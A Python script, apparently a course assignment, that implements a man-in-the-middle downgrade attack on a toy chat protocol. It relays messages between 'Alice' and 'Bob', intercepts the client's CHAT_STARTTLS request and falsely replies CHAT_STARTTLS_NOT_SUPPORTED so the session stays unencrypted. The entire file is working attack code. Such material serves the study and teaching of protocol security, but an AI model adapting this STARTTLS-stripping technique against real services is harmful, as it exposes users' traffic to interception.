import socket as sc

CHAT_HELLO = 'CHAT_HELLO'
CHAT_REPLY = 'CHAT_REPLY'
CHAT_STARTTLS = 'CHAT_STARTTLS'
CHAT_STARTTLS_ACK = 'CHAT_STARTTLS_ACK'
CHAT_STARTTLS_NOT_SUPPORTED = 'CHAT_STARTTLS_NOT_SUPPORTED'
CHAT_CLOSE = 'CHAT_CLOSE'

class down_grade_attack:
    def __init__(self,clientname,servername):
        a = sc.AF_INET
        b = sc.SOCK_STREAM
        self.pseudo_recvsock = sc.socket(a, b)
        port = int(input('Enter the port '))
        self.pseudo_recvsock.bind(('', port))
        self.pseudo_recvsock.listen(1)
        print('Waiting For Client for the connection....')

        try:
            # connection to be established between fake Bob and Alice
            self.sendsock, self.send_addr = self.pseudo_recvsock.accept()
            print(f"Connection fetched from {self.send_addr }")
        except:
            print(f"Error connecting to {self.send_addr}")

        # Creating a pseudo socket for Alice
        self.pseudo_sendsock = sc.socket(a, b)

        # fetch the IP adress from the domain name using gethostbyname for Fake Bob
        try:
            server_ip = sc.gethostbyname(servername)
            self.pseudo_sendsock.connect((server_ip, port))  # connection established between Bob and fake alice
            print(f"Connection establsihed with {server_ip}")
        except :
            print("Error!!!Failed to resolve the host")
            exit()


        self.clientname =clientname
        self.servername=servername

        self.progress_conn()
        self.close_connection()

    def progress_conn(self):
        while (True):
            # recieving from Alice & sending to Bob
            data =  self.sendsock.recv(1024)
            decoded_data=data.decode()
            print(decoded_data)
            print(f"recieved  {decoded_data} from {self.clientname}")

            if decoded_data!=CHAT_STARTTLS:
                print(f"Sent {decoded_data} to  {self.servername}")
                self.pseudo_sendsock.sendall(decoded_data.encode())

                if (data.decode() == CHAT_CLOSE):
                    print(f"Recieved {decoded_data} from Alice.....sending to Bob and Quiting!")
                    break

                # reciving from bob & sending to Alice
                data = self.pseudo_sendsock.recv(1024)
                decoded_data=data.decode()
                print(f"Recieved {decoded_data} from {self.servername}")
                print(f"Sending {decoded_data} to {self.clientname}")
                self.sendsock.sendall(decoded_data.encode())

                if (decoded_data == CHAT_CLOSE):
                    print(f"Recieved {decoded_data} from Bob.....sending to Alice and Quiting!")
                    break
            else:
                msg=CHAT_STARTTLS_NOT_SUPPORTED
                self.sendsock.sendall(msg.encode())
                print(f"Sent CHAT_STARTTLS_NOT_SUPPORTED msg to {self.clientname}")
                print("Down grade attack is now successfully launched!!!")



    def close_connection(self):
        # closing the connections
        self.sendsock.close()
        self.pseudo_sendsock.close()
        self.pseudo_recvsock.close()








